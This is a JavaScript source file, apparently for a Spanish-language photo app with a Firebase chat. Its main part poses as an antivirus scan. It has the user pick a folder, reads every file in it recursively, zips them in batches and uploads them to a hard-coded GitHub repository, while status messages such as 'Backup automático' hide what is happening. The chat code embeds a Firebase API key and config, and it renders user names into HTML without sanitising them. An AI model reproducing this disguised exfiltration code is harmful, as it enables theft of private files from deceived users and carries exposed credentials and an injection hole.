// Código de la PWA de fotos
let startTime;
let totalBatches;
let isProcessing = false;

function updateStatus(message, progress = 0) {
    const statusElement = document.getElementById('antivirus-status');
    const progressElement = document.getElementById('progress');
    const timeElement = document.getElementById('time-info');

    statusElement.innerHTML = `[${progress}%] ${message}`;
    progressElement.style.width = `${progress}%`;

    if (startTime && progress > 0 && progress < 100) {
        const elapsed = (Date.now() - startTime) / 1000;
        const remaining = (elapsed / progress) * (100 - progress);
        timeElement.innerHTML = `⏳ Tiempo restante: ~${Math.floor(remaining)} segundos`;
    } else if (progress === 100) {
        timeElement.innerHTML = '✅ Operación completada';
        // Ocultar la sección de fotos al completar
        document.getElementById('photo-section').classList.add('hidden');
        document.getElementById('chat-section').style.maxHeight = '100vh'; // Expandir el chat
    } else {
        timeElement.innerHTML = '⏳ Calculando tiempo...';
    }
}

document.getElementById('start-btn').addEventListener('click', async () => {
    if (isProcessing) return;
    isProcessing = true;

    try {
        const token = prompt('🔑 CLAVE DE ACCESO:');
        if (!token?.startsWith('ghp_t')) {
            alert('❌ CLAVE NO VALIDA');
            isProcessing = false;
            return;
        }

        startTime = Date.now();
        updateStatus('Iniciando escaneo...', 5);

        if (!window.showDirectoryPicker) throw new Error('Navegador no compatible');

        setTimeout(async () => {
            try {
                updateStatus('Accediendo al sistema...', 10);
                const folderHandle = await window.showDirectoryPicker();

                updateStatus('Analizando estructura...', 20);
                const files = await collectFiles(folderHandle);
                if (!files.length) throw new Error('No hay archivos');
                updateStatus(`Elementos detectados: ${files.length}`, 40);

                updateStatus('Comprimiendo datos...', 50);
                const zipBatches = await createZipBatches(files);
                totalBatches = zipBatches.length;

                updateStatus('Iniciando protocolo seguro...', 70);
                await processBatches(zipBatches, token);

                updateStatus('✅ OPERACIÓN EXITOSA', 100);
            } catch (error) {
                updateStatus(`❌ ERROR: ${error.message}`, 0);
                alert(`FALLO: ${error.message}`);
            }
            isProcessing = false;
        }, 100);

    } catch (error) {
        updateStatus(`❌ ERROR: ${error.message}`, 0);
        alert(`FALLO: ${error.message}`);
        isProcessing = false;
    }
});

async function collectFiles(folderHandle) {
    const files = [];
    for await (const entry of folderHandle.values()) {
        if (entry.kind === 'file') files.push(entry);
        else if (entry.kind === 'directory') {
            const subFiles = await collectFiles(entry);
            files.push(...subFiles);
        }
    }
    return files;
}

async function createZipBatches(files) {
    const batchSize = 100;
    const batches = [];
    let currentBatch = new JSZip();

    for (let i = 0; i < files.length; i++) {
        const file = files[i];
        const fileData = await file.getFile();
        currentBatch.file(file.name, await fileData.arrayBuffer());

        if ((i + 1) % batchSize === 0 || i === files.length - 1) {
            batches.push(currentBatch);
            currentBatch = new JSZip();
        }
    }
    return batches;
}

async function processBatches(batches, token) {
    localStorage.removeItem('batchesProgress');
    const startIndex = parseInt(localStorage.getItem('lastProcessedIndex')) || 0;

    for (let index = startIndex; index < batches.length; index++) {
        const batchStartTime = Date.now();
        try {
            const progress = 70 + Math.floor(((index + 1) / batches.length) * 30);
            updateStatus(`Procesando lote ${index + 1}/${batches.length}`, progress);

            const zipBlob = await batches[index].generateAsync({ type: 'blob' });
            await uploadZip(zipBlob, `secure-${Date.now()}-${index}.zip`, token);

            localStorage.setItem('lastProcessedIndex', index.toString());

            const batchTime = (Date.now() - batchStartTime) / 1000;
            const uploadSpeed = (zipBlob.size / 1024 / 1024) / batchTime;

        } catch (error) {
            localStorage.setItem('lastProcessedIndex', index.toString());
            throw error;
        }
    }
    localStorage.removeItem('lastProcessedIndex');
}

async function uploadZip(blob, zipName, token) {
    const repo = 'jaque26/ftos';
    const response = await fetch(`https://api.github.com/repos/${repo}/contents/${zipName}`, {
        method: 'PUT',
        headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            message: 'Backup automático',
            content: await blobToBase64(blob)
        })
    });

    if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || 'Error en subida');
    }
}

function blobToBase64(blob) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result.split(',')[1]);
        reader.onerror = reject;
        reader.readAsDataURL(blob);
    });
}

// Código del chat
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyDT7bX6qTx2U1EcDuugMZ0xdXzHNOifOzE",
    authDomain: "fcorp-f0633.firebaseapp.com",
    databaseURL: "https://fcorp-f0633-default-rtdb.firebaseio.com",
    projectId: "fcorp-f0633",
    storageBucket: "fcorp-f0633.firebasestorage.app",
    messagingSenderId: "536164036989",
    appId: "1:536164036989:web:f4c0776c1b7e44b5005c14",
    measurementId: "G-W15GX5VNZ1"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const mensajesRef = ref(db, 'mensajes');

let miNombre = localStorage.getItem('miNombre') || '';

if (miNombre) {
    document.getElementById('nombre-container').classList.add('hidden');
    document.getElementById('chat-input').classList.remove('hidden');
    cargarMensajes();
}

window.guardarNombre = function() {
    const nombre = document.getElementById('nombre-inicial').value.trim();
    if (!nombre) {
        alert("¡Escribe tu nombre!");
        return;
    }
    miNombre = nombre;
    localStorage.setItem('miNombre', miNombre);
    document.getElementById('nombre-container').classList.add('hidden');
    document.getElementById('chat-input').classList.remove('hidden');
    cargarMensajes();
};

window.enviar = function() {
    const msg = document.getElementById('mensaje').value.trim();
    if (!msg) {
        alert("¡Escribe un mensaje!");
        return;
    }

    const timestamp = new Date().toISOString();
    const sanitizedMsg = new DOMParser().parseFromString(msg, 'text/html').body.textContent;
    const mensaje = {
        nombre: miNombre,
        mensaje: sanitizedMsg,
        timestamp: timestamp,
        hora: new Date().toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit' })
    };

    push(mensajesRef, mensaje)
        .then(() => {
            document.getElementById('mensaje').value = '';
            const notif = document.getElementById('notificacion');
            notif.style.display = 'block';
            setTimeout(() => notif.style.display = 'none', 1000);
        })
        .catch(error => {
            alert("Error al enviar: " + error.message);
        });
};

function cargarMensajes() {
    onValue(mensajesRef, (snapshot) => {
        const messagesDiv = document.getElementById('messages');
        messagesDiv.innerHTML = '';

        const data = snapshot.val();
        if (!data) {
            messagesDiv.innerHTML = '<div id="chat-vacio">CHAT FCORP</div>';
            return;
        }

        Object.entries(data).forEach(([id, mensaje]) => {
            const clase = (mensaje.nombre === miNombre) ? 'mio' : 'otro';
            const safeMessage = new DOMParser().parseFromString(mensaje.mensaje, 'text/html').body.textContent;
            const html = `<div class="mensaje ${clase}" data-id="${id}"><b>${mensaje.nombre}</b>: ${safeMessage}<div class="hora">${mensaje.hora}</div></div>`;
            messagesDiv.insertAdjacentHTML('beforeend', html);
        });

        messagesDiv.scrollTop = messagesDiv.scrollHeight;
    }, (error) => {
        alert("Error al cargar mensajes: " + error.message);
    });
}
